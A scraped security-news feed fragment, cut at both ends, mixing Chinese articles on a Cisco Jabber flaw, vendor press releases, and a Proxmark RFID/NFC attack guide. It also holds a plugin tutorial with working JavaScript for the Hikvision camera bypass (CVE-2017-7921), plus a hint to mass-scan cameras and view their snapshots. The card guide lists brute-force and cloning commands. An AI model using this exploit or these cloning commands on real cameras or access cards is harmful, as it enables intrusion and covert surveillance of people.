src=\"https://thehackernews.com/images/-7-WFiNuCf2c/X1CqF26fZYI/AAAAAAAAAu4/n_YYDP5tXLwjE3phFiKjRtgZ_FGLQyw1ACLcBGAsYHQ/s728-e100/hacking-cisco.jpg\" alt=\"hacking cisco\"/></p><p style=\"text-align: center;\">被拦截和修改的XMPP-IM消息，img tag就是新添加的恶意tag</p><p>为利用该漏洞，攻击者还利用了Chromium Embedded Framework (CEF)中的一个单独的有漏洞的函数，其中CEF是用来在其他app中嵌入Chromium web 浏览器的开源框架，攻击者滥用CEF 在受害者设备上执行恶意.exe 文件。</p><p>此外，攻击者还需要有受害者XMPP域名的访问权限来发送利用该漏洞所需的恶意XMPP消息。</p><p>其他三个漏洞可以被利用来注入恶意命令，引发信息泄露，比如收集用户的NTLM 口令哈希值。</p><p>考虑到疫情影响下视频会议软件的流行情况，Cisco Jabber等视频会议系统越来越成为攻击者的目标。研究人员建议用户尽快更新到最新版本以避免受到该漏洞的影响。</p><p><strong>PoC</strong></p><p>PoC视频如下所示：</p><p style=\"text-align: center;\"><img src=\"https://thehackernews.com/images/-6zBRyYa11Gw/X1CpnSAYh6I/AAAAAAAAAuw/bUKB1SKpOOETuY4wX7TFZnaPOpGfM31tACLcBGAsYHQ/s728-e100/cisco-jabber-hacking.gif\"/></p><p>更多技术细节参见：<a href=\"https://watchcom.no/nyheter/nyhetsarkiv/uncovers-cisco-jabber-vulnerabilities/\">https://watchcom.no/nyheter/nyhetsarkiv/uncovers-cisco-jabber-vulnerabilities/</a></p><p>思科发布的安全公告参见：</p><p><a href=\"https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-jabber-UyTKCPGg\">https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-jabber-UyTKCPGg</a></p>","descriptionType":"text/html","publishedDate":"Fri, 04 Sep 2020 02:48:47 +0000","feedId":6942,"bgimg":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599133209630949.png","linkMd5":"5a8d9baa3fcf5964289fd4c120fda57b","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn31@2020_1/2020/09/05/07-31-04-456_e165eb51654a5a19.webp","destWidth":1107,"destHeight":217,"sourceBytes":76445,"destBytes":28468,"author":"ang010ela","articleImgCdnMap":{"https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599133209630949.png":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn31@2020_1/2020/09/05/07-31-04-456_e165eb51654a5a19.webp","https://thehackernews.com/images/-7-WFiNuCf2c/X1CqF26fZYI/AAAAAAAAAu4/n_YYDP5tXLwjE3phFiKjRtgZ_FGLQyw1ACLcBGAsYHQ/s728-e100/hacking-cisco.jpg":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn56@2020_3/2020/09/05/07-31-19-165_ae35e8ca92c82e22.webp","https://thehackernews.com/images/-6zBRyYa11Gw/X1CpnSAYh6I/AAAAAAAAAuw/bUKB1SKpOOETuY4wX7TFZnaPOpGfM31tACLcBGAsYHQ/s728-e100/cisco-jabber-hacking.gif":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn43@2020_3/2020/09/05/07-31-17-226_29a279832ee8e9de.webp"},"publishedOrCreatedDate":1599291056253},{"createdTime":"2020-09-05 15:30:56","updatedTime":"2020-09-05 15:30:56","title":"亚信安全从实践出发  助力“等保、关保”开启新征程","link":"https://www.4hou.com/posts/o7Bz","description":"<p>近日，在公安部网络安全保卫局的指导下，由公安部第三研究所、公安部第一研究所主办，亚信安全等10家国内网络安全厂商联合承办的网络安全等级保护和关键信息基础设施安全保护工作宣贯会在北京成功举办。在本次宣贯会上，亚信安全与院士、中央网信办领导、公安部领导，以及各行业专家，共议“等保、关保”落地方法与执行机制等热点话题，同时更从“实战出发”的多维角度，为参会用户带来了推广和落实网络安全等级保护、关键信息基础设施保护安全制度方面的专业实践经验。<br/></p><p style=\"font-size: medium;white-space: normal;text-align: justify\"><span style=\"font-family: 微软雅黑, sans-serif;color: windowtext\">&#160;<img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599207440145763.png\" title=\"1599207440145763.png\" alt=\"图片 1.png\"/></span><span style=\"color: windowtext; font-family: 微软雅黑, sans-serif; text-align: center;\">&#160;</span></p><p style=\"font-size: medium;white-space: normal;text-align: justify\"><strong><span style=\"font-family: 微软雅黑, sans-serif;color: windowtext\">众专家权威解读“等保、关保”</span></strong></p><p style=\"font-size: medium;white-space: normal;text-align: justify\"><span style=\"font-family: 微软雅黑, sans-serif;color: windowtext\">宣贯会上，中国工程院院士沈昌祥，公安部网络安全保卫局一级巡视员、副局长兼总工程师郭启全，中央网信办网络安全协调局处长王营康、自然资源部信息中心总工程师顾炳中、中国电科首席专家董贵山、人保财险责任险部副总经理邵运州以及国内知名网络安全企业、研究机构有关专家分别发表了致辞与主题演讲。大会重点宣贯了公安部《贯彻落实网络安全等级保护制度和关键信息基础设施安全保护制度的指导意见》，</span><span style=\"font-family: 微软雅黑, sans-serif;color: windowtext\">并对</span><span style=\"font-family: 微软雅黑, sans-serif;color: windowtext\">《网络安全等级保护定级指南》</span><span style=\"font-family: 微软雅黑, sans-serif;color: windowtext\">的</span><span style=\"font-family: 微软雅黑, sans-serif;color: windowtext\">国家标准</span><span style=\"font-family: 微软雅黑, sans-serif;color: windowtext\">进行了权威</span><span style=\"font-family: 微软雅黑, sans-serif;color: windowtext\">解读</span><span style=\"font-family: 微软雅黑, sans-serif;color: windowtext\">。同时大会还</span><span style=\"font-family: 微软雅黑, sans-serif;color: windowtext\">分享了网络安全等级保护制度和关键信息基础设施安全保护制度应用经验，全面指导网络安全工作落地。</span></p><p style=\"font-size: medium;white-space: normal;text-align: justify\"><span style=\"font-family: 微软雅黑, sans-serif;color: windowtext\">&#160;<img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599207454762532.png\" title=\"1599207454762532.png\" alt=\"图片 2.png\"/></span><span style=\"color: windowtext; font-family: 微软雅黑, sans-serif;\">&#160;</span></p><p style=\"font-size: medium;white-space: normal;text-align: justify\"><span style=\"font-family: 微软雅黑, sans-serif;color: windowtext\">近年来，随着信息技术的广泛应用和网络空间的兴起发展，各国在政治、经济、文化、社会公共安全等方面的利益及公民在网络空间的合法权益也面临着日益严峻的风险与挑战。为应对国家级威胁，各国纷纷制定国家网络安全战略，以降低网络空间的脆弱性，提升网络安全保障能力。而本次宣讲会上强调的关键信息基础设施安全保护与网络安全等级保护，不仅是网络安全法确定的两项重要制度，更是国家网络安全战略重要组成部分，两者相互配合，互为补充，体现了国家安全、危险管理和用户保护的三位一体。</span></p><p style=\"font-size: medium;white-space: normal;text-align: justify\"><span style=\"font-family: 微软雅黑, sans-serif;color: windowtext\">2019年12月1日网络安全等级保护相关国家标准正式实施，标志着我国网络安全等级保护制度进入了全新时代。进入2020年后，为进一步指导及推动标准落地，我国先后制定了《网络安全等级保护定级指南》（GB/T 22240-2020）及《贯彻落实网络安全等级保护制度和关键信息基础设施安全保护制度的指导意见》(公网安【2020】1960号)，明确了贯彻落实网络安全等级保护制度和关键信息基础设施安全保护制度的指导思想、基本原则、工作目标和具体措施。一系列政策法规的落地，为各级用户指明了实战化、体系化、常态化的新思路，这也意味着各级企事业机关单位网络安全建设已经开启了新征程。</span></p><p style=\"font-size: medium;white-space: normal;text-align: justify\"><strong><span style=\"font-family: 微软雅黑, sans-serif;color: windowtext\">“从实战出发”开启新征程</span></strong></p><p style=\"font-size: medium;white-space: normal;text-align: justify\"><span style=\"font-family: 微软雅黑, sans-serif;color: windowtext\">为协助各类型企业及政府部门提升网络防护建设，增强广大用户自身安全防护能力，亚信安推出了等级保护2.0安全解决整体方案，包括：以身份为基础，构建网络空间信任体系;以攻防为视角，提升全方位主动防御能力;以联动为策略，提升网络安全事件智能响应能力;以运维为关键，加强统一集中管控平台建设;从实战出发，建设自适应安全体系。</span></p><ul class=\" list-paddingleft-2\" style=\"list-style-type: disc;\"><li><p><strong>以身份为基础，构建网络空间信任体系</strong>：在身份即服务、身份即安全的理念下，亚信安全提供了全功能化、全行业化、全形态化、全维度化的身份服务基础设施建设方案，提供了内外融合、人物联动的登录认证和身份鉴别服务。</p></li><li><p><strong>以攻防为视角，提升全方位主动防御能力</strong>：以“关口前移”为目标，亚信安全提供了XDR解决方案，包括了：EDR（终端检测及响应）、NDR（网络检测及响应）以及MDR（智能管理平台的检测及响应），从技术、工具、人员、服务、经验等诸多方面提供了一个完善的标准流程与体系。</p></li><li><p><strong>以联动为策略，提升网络安全事件智能响应能力</strong>：亚信安全从威胁发现检测、处理响应、定型分析、定量分析形成闭环，通过端到端相互关联的威胁分析系统，协助用户从单一安全事件监控向整体安全态势感知转变，以整体联动的网络安全架构全面协助用户提升应急响应能力。</p></li><li><p><strong>以运维为关键，加强统一集中管控平台建设</strong>：等保2.0的运维是传统运维向安全运营转变的重要标志。为此，亚信安全提供了以威胁情报+态势感知为核心的安全运营管理中心，为运维管理配备“安全大脑”。</p></li><li><p><strong>从实战出发，建设自适应安全体系</strong>：在经过从多层防御阶段、深度分析阶段、精密编排阶段的积累与历练之后，亚信安全通过持续自适应防御模型的扩展内涵和外延，进而帮助用户实现提前洞察、提前预测、提前响应、及时恢复补救的安全防御能力。</p></li></ul><p class=\"MsoListParagraph\" style=\"margin-left: 28px;text-indent: 0;font-size: medium;white-space: normal;text-align: justify\"><span style=\"font-family: 微软雅黑, sans-serif;color: windowtext\">&#160;<img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599207478376658.png\" title=\"1599207478376658.png\" alt=\"图片 3.png\"/></span><span style=\"color: windowtext; font-family: 微软雅黑, sans-serif; text-align: center;\">&#160;</span></p><p style=\"font-size: medium;white-space: normal;text-align: justify\"><strong><span style=\"font-family: 微软雅黑, sans-serif;color: windowtext\">发挥企业创新责任 助推“等保、关保”落地</span></strong></p><p style=\"font-size: medium;white-space: normal;text-align: justify\"><span style=\"font-family: 微软雅黑, sans-serif;color: windowtext\">产业互联网时代，网络“战场”的攻与防远远没有停止，保护网络空间安全，维护网络空间命运共同体将是这个时代赋予企业的重大使命。而按照国家网络安全法律、战略和等级保护制度要求，推广安全可信产品和服务，守住网络安全底线，则是中国网安企业不可推卸的社会责任。</span></p><p style=\"font-size: medium; white-space: normal; text-align: justify;\"><span style=\"font-family: 微软雅黑, sans-serif;color: windowtext\">近年来，亚信安全在政府、金融、交通、电信、能源、制造等行业市场的等级保护建设工作中取得了良好的进展。未来，亚信安全将继续发挥身份安全、APT治理、态势感知、大数据安全、云安全等核心领域的技术实力，携手政府相关部门，联合更多的企业用户，打造最佳的实践方案，助推“等保、关保”工作落地。</span></p>","descriptionType":"text/html","publishedDate":"Fri, 04 Sep 2020 08:18:17 +0000","feedId":6942,"bgimg":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599207440145763.png","linkMd5":"4f78d6861e72f68e32f7db818d64cf27","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn28@2020_5/2020/09/05/07-31-03-369_094c6d9d853ea88e.webp","destWidth":722,"destHeight":480,"sourceBytes":614280,"destBytes":65710,"author":"高坂穗乃果","articleImgCdnMap":{"https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599207440145763.png":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn28@2020_5/2020/09/05/07-31-03-369_094c6d9d853ea88e.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599207454762532.png":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn48@2020_2/2020/09/05/07-31-24-043_0eac6fcdf6322061.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599207478376658.png":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn29@2020_4/2020/09/05/07-31-28-869_cbe9ce94e169c314.webp"},"publishedOrCreatedDate":1599291056252},{"createdTime":"2020-09-05 15:30:56","updatedTime":"2020-09-05 15:30:56","title":"插件分享 | 可以查看摄像头快照的“Hikvision插件”","link":"https://www.4hou.com/posts/wZNw","description":"<p style=\"text-align:center\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599191165142040.jpeg\" title=\"1599190433175258.jpeg\" alt=\"微信图片_20200904113341.jpg\" width=\"588\" height=\"715\"/></p><p>前言：之前在Goby群里看到有人讨论过海康这个漏洞，自己平时也有遇到过。该漏洞能够查看摄像头的的快照，但是每次都需要手动去访问。耳东表姐一直催插件（没有），所以写一个简单的验证插件来熟悉熟悉goby的插件开发流程。希望通过此次分享，吸引更多人大佬能加入到开发插件的行列中来，搞点牛批的插件出来。</p><p><span style=\"font-size: 20px;\"><strong>0x001 插件效果</strong></span></p><p>当扫描出Hikvision IP Camera Access Bypass漏洞后，会在漏洞页面和资产详情页面显示”验证按钮”（和MSF插件是一样的），点击之后即可弹窗看到摄像头快照PPT（5秒刷新一次）。</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599191166115134.gif\" title=\"1599190596510228.gif\" alt=\"640.gif\"/></p><p><span style=\"font-size: 20px;\"><strong>0x002&#160;开发流程</strong></span></p><p>1. 注册自定义组件要触发的命令</p><p>Goby官方的开发文档里有很详细的说明，也有提供样例项目，将其下载并解压到goby/extensions目录下，然后运行goby就能看到demo了，剩下的就是改了:</p><section><pre class=\"brush:html;toolbar:false;\"><p>exports.activate = activate;<br/>function activate(content) { &#160; &#160;goby.registerCommand(&#39;Hikvision&#39;, (content) =&#62; { &#160; &#160; &#160; &#160; &#160; &#160;let path = __dirname + &#34;/index.html?hostinfo=&#34; + content.hostinfo; &#160; &#160;//设置打开新窗口的html文件路径，并传入当前hostinfo信息 &#160; &#160; &#160; &#160;goby.showIframeDia(path, &#34;Hikvision登录绕过验证&#34;, &#34;800&#34;, &#34;600&#34;); &#160; &#160;//打开一个800*600的iframe窗口，窗口标题为“Hikvision登录绕过验证” &#160; &#160;});<br/> &#160; &#160;goby.registerCommand(&#39;Hikvision_visi&#39;, &#160;(content) =&#62; { &#160; &#160; &#160; &#160; &#160; &#160;return content.name === &#34;Hikvision IP Camera Access Bypass(ICSA-17-124-01/CVE-2017-7921)&#34; &#160; &#160;//对漏洞名称进行判断 &#160; &#160;});}<br/>exports.activate&#160;=&#160;activate;</p></pre></section><p>提示: 因为要在扫描结果中存在该漏洞才能显示该组件。所以这里使用了控制组件是否显示的回调命令，它绑定在views的visible字段上，根据其返回的布尔值来决定是否显示该组件。</p><p>2. 配置视图入口点</p><p>插件的入口点，我选在漏洞列表页，需要在package.json里进行配置，即contributes.views.vulList,填写想要的标题、对应的命令、以及控制该组件显示的回调命令。</p><pre class=\"brush:html;toolbar:false;\"><p>&#34;contributes&#34;: {<br/> &#160; &#160; &#160; &#160;&#34;views&#34;: {<br/> &#160; &#160; &#160; &#160; &#160; &#160;&#34;vulList&#34;: [<br/> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;{<br/> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;&#34;command&#34;: &#34;Hikvision&#34;,<br/> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;&#34;title&#34;: &#34;验证&#34;,<br/> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;&#34;visible&#34;: &#34;Hikvision_visi&#34;<br/> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;}<br/> &#160; &#160; &#160; &#160; &#160; &#160;]<br/> &#160; &#160; &#160; &#160;}<br/></p></pre><p>3. 开发html页面</p><p>官方使用的layui，因为不需要复杂的界面，直接就在给的样例HTTP发包插件的基础上去改。开发流程很简单，因为我是真的菜，所以请教了我的同事@Ma1tobiose</p><p>开发流程如下：</p><p>1. &#160;&#160;获取iframe的参数，这段是直接从官方样例里拿过来简单做了下修改：</p><p></p><pre class=\"brush:html;toolbar:false;\">function&#160;GetIframeQueryString(name,&#160;id)&#160;{\n&#160;&#160;&#160;&#160;&#160;&#160;var&#160;reg&#160;=&#160;new&#160;RegExp(&#39;(^|&#38;)&#39;&#160;+&#160;name&#160;+&#160;&#39;=([^&#38;]*)(&#38;|$)&#39;,&#160;&#39;i&#39;);\n&#160;&#160;&#160;&#160;&#160;&#160;var&#160;r&#160;=window.parent.document.getElementById(id).contentWindow.location.search.substr(1).match(reg);\n&#160;&#160;&#160;&#160;&#160;&#160;if&#160;(r&#160;!=&#160;null)&#160;{\n&#160;&#160;&#160;&#160;&#160;&#160;return&#160;decodeURI(r[2]);\n&#160;&#160;&#160;&#160;&#160;&#160;}\n&#160;&#160;&#160;&#160;&#160;&#160;return&#160;null;\n}</pre><p>2.拿到漏洞的ip后进行拼接，将返回的图片传给定义好的IMG标签，并吗，每5秒一次进行循环请求：<br/></p><pre class=\"brush:html;toolbar:false;\">&#160;&#160;&#160;&#160;//&#160;拼url\n&#160;&#160;&#160;&#160;var&#160;url&#160;=&#160;(&#34;http://&#34;+GetIframeQueryString(&#34;hostinfo&#34;,&#160;&#34;goby-iframe&#34;)+&#34;/onvif-http/snapshot?auth=YWRtaW46MTEK&#34;);\n&#160;&#160;&#160;&#160;\n&#160;\n&#160;&#160;&#160;&#160;window.onload&#160;=&#160;function&#160;()&#160;{&#160;&#160;&#160;\n&#160;&#160;&#160;&#160;&#160;get()\n&#160;&#160;&#160;&#160;}\n&#160;&#160;&#160;&#160;setInterval(function&#160;()&#160;{\n&#160;&#160;&#160;&#160;&#160;&#160;get();\n&#160;&#160;&#160;&#160;},&#160;5000);\n&#160;\n&#160;&#160;&#160;&#160;//&#160;循环请求\n&#160;&#160;&#160;&#160;function&#160;get(){\n&#160;&#160;&#160;&#160;&#160;&#160;$(&#34;#test&#34;).attr(&#39;src&#39;,url&#160;+&#160;&#34;&#38;t=&#34;&#160;+&#160;Math.random());\n&#160;&#160;&#160;&#160;}</pre><p></p><p>开发测试完之后就是打包上传了，因为直接是拿官方样例修改的，所以目录结构不需要再重构。</p><p>4.&#160;打包上传</p><p>打包前需要注意的两点：一是demo的gif需要生成一个在线的地址，因为goby还不支持还没实现抓取readme图片。二是压缩包和文件夹名称须保持一致，文件放置如下图所示。</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599191166208376.png\" title=\"1599190978890088.png\" alt=\"图片1.png\"/></p><p></p><p>5. 更新</p><p>因为更换demo图地址，所以我更新了一次版本。打开package.json修改版本号，以及在CHANGELOG.md新增更新说明。更新上传过程中还遇到一个bug：没有权限，但是耳东小姐姐积极沟通复现解决掉了。</p><p><span style=\"font-size: 20px;\"><strong>0x003&#160;小结</strong></span></p><p></p><p>Goby的开发文档里写的很详细很清楚，开发整个插件也就用了一个小时的时间。当然也是因为功能比较简单，感觉没啥太大用处，主要是为了熟悉Goby的插件开发流程。理论上来说插件能够搭配Goby实现很多场景的应用，但是因为插件功能刚开放没有成为亮点，只能用JS开发也比较有限制性。</p><p>表哥们可以利用FOFA插件和大壮表哥开发的Shodan插件查询海康威视摄像头资产，并批量导入，扫出漏洞后使用Hikvision插件看PPT（你懂的）。</p><p>漏洞详情可参考：<a href=\"https://www.seebug.org/vuldb/ssvid-96469\">https://www.seebug.org/vuldb/ssvid-96469</a></p><p>插件开发文档：https://github.com/gobysec/GobyExtension</p>","descriptionType":"text/html","publishedDate":"Fri, 04 Sep 2020 06:51:45 +0000","feedId":6942,"bgimg":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599191165142040.jpeg","linkMd5":"b6031335b5a855e88d6461fc3df32e2f","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn40@2020_3/2020/09/05/07-31-02-864_bc06172dbe5b7162.webp","destWidth":1080,"destHeight":1462,"sourceBytes":114396,"destBytes":79712,"author":"Goby","articleImgCdnMap":{"https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599191165142040.jpeg":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn40@2020_3/2020/09/05/07-31-02-864_bc06172dbe5b7162.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599191166115134.gif":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn42@2020_2/2020/09/05/07-31-33-279_565d850af2b0b8f7.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599191166208376.png":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn68@2020_1/2020/09/05/07-31-25-535_d81acffcc5905bd6.webp"},"publishedOrCreatedDate":1599291056254},{"createdTime":"2020-09-05 15:30:56","updatedTime":"2020-09-05 15:30:56","title":"国内首家！腾讯会议通过国际权威机构最高难度安全测试","link":"https://www.4hou.com/posts/Y0Jp","description":"<p>腾讯会议再获国际权威机构认可。今日获悉，腾讯会议正式通过国际权威SOC2 Type2数据安全审计报告，成为国内首家通过SOC2 Type2审计安全性、可用性和保密性三大原则的专业视频会议产品。</p><p>SOC全称System and Organization Controls，是由独立第三方国际知名审计事务所基于美国注册会计师协会（AICPA）制定的SSAE NO.18鉴证准则进行评估，继而出具的鉴证报告，也是被云计算行业广泛认可的鉴证报告。其中SOC2主要针对服务商安全性、可用性、处理完整性、保密性和隐私性进行审计，&#160;Type2抽审的模式更是提高了其通过难度，堪称业界的“最高难度测试”。</p><p>腾讯会议凭借在数据安全领域的出色表现，一次通过全球最严苛，最具权威性的SOC2 Type2审计安全性、可用性和保密性三大原则，这意味着腾讯会议在数据安全领域已经达到国际顶尖水平。</p><p>受疫情影响，2020年以视频会议为代表的远程办公SaaS产品使用人数呈指数级增长，安全成为用户选择远程办公产品时的首要考量因素。作为一款音视频会议产品，腾讯会议自发布之时，就把安全作为产品设计的重点，不仅有七大安全实验室实时护航，同时采用了AI+Web防火墙，有效抵御OWASP定义的十大Web安全威胁攻击。</p><p>除此之外，腾讯会议还通过设置会议密码、锁定会议、黑白名单、屏幕共享水印、会议等候室等功能，实现了对会议安全和隐私的全流程保障。腾讯会议在安全层面的全面防护已经成为被用户广泛认可的重要因素。</p><p>值得一提的是，在通过SOC2 Type2权威审计前，腾讯会议还拿下了国内最权威、对非银行机构的最高级认证——公安部等级保护测评三级认证，同时也获得了可信云企业级SaaS认证，而该认证也是中国目前唯一针对云计算领域的权威认证体系，是在国际上广受认可的认证标准之一。</p><p>自今年年初新冠疫情爆发以来，为了应对全球日益增长的远程办公需求，腾讯会议在第一时间免费开放最高300人不限时会议功能，上线2个月日活用户超过1000万，成为国内最多人使用视频会议产品，国际版VooV Meeting也已上线超过100多个国家和地区。</p><p>目前，腾讯会议已被广泛应用在包括政府、教育、医疗在内的诸多行业，并成为联合国教科文组织高等教育创新中心推荐使用工具，以及为联合国成立75周年，有史以来最大规模的全球对话提供服务。未来，腾讯会议将在安全建设方面持续完善和升级，为全球用户提供更灵活、高效、稳定、安全的视频会议服务。</p><p><br/></p>","descriptionType":"text/html","publishedDate":"Wed, 02 Sep 2020 05:38:37 +0000","feedId":6942,"bgimg":"","linkMd5":"377aed218e56b93e46036c6056954d5a","bgimgJsdelivr":"","metaImg":"","author":"高坂穗乃果","publishedOrCreatedDate":1599291056255},{"createdTime":"2020-09-05 15:30:56","updatedTime":"2020-09-05 15:30:56","title":"NFC和RFID卡攻击研究","link":"https://www.4hou.com/posts/lD27","description":"<p style=\"text-align: left;\">如果一个硬件上包含NFC或RFID组件，则Proxmark是完成这项工作最好的工具。你可以使用它来分析卡类型，演示卡克隆攻击，枚举攻击，甚至对受密码保护的卡进行算法绕过。这是一个非常好的工具，但是设置起来可能有些麻烦。</p><pre class=\"brush:html;toolbar:false;\">&#160;https://amzn.to/2SScxaT</pre><p style=\"text-align: left;\">以下是有关常见使用场景以及安装过程中可能遇到的问题的说明。这些说明适用于Proxmark 3，但也适用于较新的硬件版本。</p><p><span style=\"font-size: 20px;\"><strong>物理设置</strong></span></p><p style=\"text-align: left;\">将Proxmark插入电源之前，请务必确保已连接天线。在未连接天线的情况下意外运行搜索命令可能会损坏设备。确保USB转micro-usb线已插入计算机。</p><p style=\"text-align:center\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200525/1590368411143749.jpg\"/></p><p>混合使用可能会损坏设备，因此在继续操作之前，请确保连接正确。</p><p><span style=\"font-size: 20px;\"><strong>固件更新</strong></span></p><p>最好确保是最新固件（你需要确保客户端与安装的固件版本匹配）。通常，存储库将使用新的攻击媒介和更多卡类型进行更新，因此，始终处于最新状态是一个好主意。</p><p>如果你已经知道你RFID卡使用有加密功能的NFC卡，请跳至此页面底部，以使用社区功能提供高级功能。以下来自Github Wiki的设置指南将引导你编译并将官方固件刷到Proxmark中：</p><p><strong><strong style=\"white-space: normal;\">·</strong>&#160;</strong><a href=\"https://github.com/Proxmark/proxmark3/wiki/Ubuntu-Linux\">https://github.com/Proxmark/proxmark3/wiki/Ubuntu-Linux</a></p><p>在本机Linux机器上执行此操作。Proxmark在串行接口上闪烁，并且虚拟机有时会出现时序或驱动程序问题，这会使该过程变得复杂。</p><p>请按照上述指南中的说明启动客户端，并首次验证更新的固件。</p><p><span style=\"font-size: 20px;\"><strong>故障排除</strong></span></p><p>如果闪烁后，该设备不再显示为USB，请在插入前按住Proxmark上的按钮。10秒钟后，该设备应显示为USB设备。闪烁主图像时，请继续按住按钮。成功刷新引导加载程序但无法刷新主映像。</p><p>关闭Proxmark客户端后，你可能必须拔出并重新插入物理USB设备。</p><p>客户端可能需要以sudo身份运行才能访问/dev/ttyACM0文件。</p><p><span style=\"font-size: 20px;\"><strong>运行客户端</strong></span></p><p>如果固件没问题，则应该位于Proxmark3存储库中，运行以下命令以启动Proxmark命令行界面：</p><p><strong style=\"white-space: normal;\">·&#160;</strong>./client/proxmark3 /dev/ttyACM0</p><p>你可能需要其他开发文件才能访问Proxmark。你可以sudo dmesg | tail在插入设备后找到此功能，创建的设备文件应显示在此系统日志中。</p><p>Proxmark带有内置的LUA脚本接口，但是老实说我从未使用过它。标准的proxmark客户端直接接受来自STDIN的输入，为你的用例编写Python脚本并将其直接传递到客户端非常容易。</p><p><span style=\"font-size: 20px;\"><strong>RFID低频卡</strong></span></p><p>LF（低频）卡通常以125或134 KHz的频率运行。与NFC卡相比，它们的射程更长，因此，很少有加密机制。通常，可以简单地从前面显示的文本中克隆卡，这可以在攻击模拟中注意到，并且诸如<a href=\"https://know.bishopfox.com/blog/2014/09/tastic-rfid-thief-silent-deadly\">RFID tastic thief之类的设备</a>可以从3英尺远的地方窃取卡。</p><p>适用于低频使用的天线是圆形的，背面用白色字体表示“ LF”。要验证天线是否正确，可以运行hw tune。输出应显示你的HF天线不适合使用，表明该天线旨在用于LF RFID。以下各节将演示最常见的RFID密钥的用法。如果卡类型未知，请首先尝试通过以下方法发现它：</p><p><strong style=\"white-space: normal;\">·&#160;</strong>lf search u</p><p><span style=\"font-size: 20px;\"><strong>HID代理卡</strong></span></p><p>这些卡非常常见，可以通过引擎盖下的许多芯片实现，包括EM4x05或T55x7。通常，这些卡没有密码保护或加密功能，只需知道卡ID即可将其克隆。</p><p>不幸的是，在这里无法自动执行暴力攻击，因为HID具有很好的接近检测功能，可以防止在读取器附近检测到天线时进行多次读取。使用HID Prox卡时，以下是一些有用的命令：</p><p><strong style=\"white-space: normal;\">·&#160;</strong>检测卡ID： lf hid demod</p><p><strong style=\"white-space: normal;\">·&#160;</strong>产生卡号： lf hid encode</p><p><strong style=\"white-space: normal;\">·&#160;</strong>克隆到T55x7： lf hid clone</p><p><span style=\"font-size: 20px;\"><strong>EM410x</strong></span></p><p>这些卡比HID代理卡少见，但确实存在，常以霍尼韦尔品牌命名，这些卡不依赖任何高级身份验证。克隆卡ID就足以复制卡。由于EM410x没有良好的接近度检测功能，因此此处可能会强制执行暴力破解，这些卡可能被T55x7芯片欺骗。</p><p><strong style=\"white-space: normal;\">·&#160;</strong>检测卡ID： lf em 410xread 1</p><p><strong style=\"white-space: normal;\">·&#160;</strong>爆破卡ID： lf em 410xbrute</p><p><strong style=\"white-space: normal;\">·&#160;</strong>克隆卡ID： lf em 410xwrite</p><p><span style=\"font-size: 20px;\"><strong>HF卡（NFC）</strong></span></p><p>NFC卡通常以13.56MHz的频率运行，因此范围更小。有趣的是，这些卡更有可能具有强大的加密功能，并且比基本的RFID卡要先进。也就是说，许多型号都存在严重缺陷或完全没有加密，显示出的漏洞与RFID部分所述的漏洞相似。</p><p>RyscCorp在阅读器上说，适用于HF的天线是矩形的。确保白色开关的位置远离USB端口，朝向RyscCorp。要验证天线是否正确，可以运行hw tune。输出应显示你的LF天线不适合使用，表明该天线适用于HF NFC。</p><p>以下各节将演示最常见的NFC密钥的用法。如果卡类型未知，请首先尝试通过以下方法发现它：</p><p><strong style=\"white-space: normal;\">·&#160;</strong>hf search u</p><p><span style=\"font-size: 20px;\"><strong>MIFARE经典版</strong></span></p><p>在运输过程中以及各种业务中使用的非常常见的卡。该卡使用带有2个不同密钥的身份验证方案，可保护16个扇区的内部存储。16个扇区中的每一个都有64个字节。可以对2个键中的每个键进行编码，以分别对16个扇区中的每个扇区进行读/写。从理论上讲，这是一个非常合理的许可模型，实际上，它几乎总是降级为以下模型。</p><p>一个密钥用作“公共”密钥，通常将其设置为已知的默认值，以便公共读者可以查看该密钥。另一个密钥用作秘密密钥，可以查看卡上的其余数据。由于<a href=\"http://www.nicolascourtois.com/papers/mifare_all.pdf\">Nicolas Courtois的</a>工作，存在一种算法绕过的方法，它将帮助我们通过这种授权模型攻击RFID卡。</p><pre 